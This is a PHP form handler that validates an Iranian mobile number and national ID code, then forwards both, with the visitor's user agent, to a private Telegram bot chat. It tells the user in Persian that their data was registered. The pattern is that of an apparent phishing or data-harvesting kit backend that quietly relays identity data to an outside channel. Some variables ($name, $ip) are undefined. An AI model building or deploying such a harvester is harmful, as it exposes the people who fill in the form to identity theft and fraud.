<?php

header('Content-Type: text/html; charset=utf-8');

$errors = array();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $mobile = $_POST['mobile'];
    $nationalCode = $_POST['nationalCode'];

    
    $mobile = str_replace(' ', '', $mobile);
    $nationalCode = str_replace(' ', '', $nationalCode);

    

    if (empty($mobile)) {
        $errors['mobile'] = 'شماره موبایل را وارد کنید';
    } elseif (!preg_match('/^09\d{9}$/', $mobile)) {
        $errors['mobile'] = 'شماره موبایل نامعتبر است';
    }

    if (empty($nationalCode)) {
        $errors['nationalCode'] = 'کد ملی را وارد کنید';
    } elseif (!preg_match('/^\d{10}$/', $nationalCode)) {
        $errors['nationalCode'] = 'کد ملی را بصورت کامل وارد کنید';
    } elseif (!validateIranianNationalCode($nationalCode)) {
        $errors['nationalCode'] = 'کد ملی نامعتبر است';
    }

    if (!empty($errors)) {
        $firstError = reset($errors);
        echo json_encode(["error" => $firstError]);
    } else {
        sendToTelegramBot($name, $mobile, $nationalCode);
        echo json_encode(["success" => "اطلاعات با موفقیت ثبت شد"]);
    }
}

function validateIranianNationalCode($nationalCode) {
    // Remove spaces from the national code
    $nationalCode = str_replace(' ', '', $nationalCode);

    // Validate the Iranian national code using the correct algorithm
    if (!preg_match('/^\d{10}$/', $nationalCode)) {
        return false;
    }

    if (preg_match('/^(\d)\1*$/', $nationalCode)) {
        return false;
    }

    $checkDigit = intval(substr($nationalCode, 9, 1));
    $digits = str_split(substr($nationalCode, 0, 9));
    $checksum = 0;

    for ($i = 0; $i < 9; $i++) {
        $checksum += intval($digits[$i]) * (10 - $i);
    }

    $remainder = $checksum % 11;
    $computedCheck = ($remainder < 2) ? $remainder : 11 - $remainder;

    return ($checkDigit === $computedCheck);
}

function sendToTelegramBot($name, $mobile, $nationalCode) {
    require_once 'config.php';
    $telegramEndpoint = "https://api.telegram.org/bot$botToken/sendMessage";
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    $message = "
𝙢𝙤𝙗𝙞𝙡𝙚: `$mobile`

𝙘𝙤𝙙𝙚: `$nationalCode`
    
𝙞𝙥: `$ip`
    
`$userAgent`";

    // Prepare the request data
    $requestData = array(
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' =>'MarkdownV2'
    );

    $ch = curl_init($telegramEndpoint);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $requestData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

?>
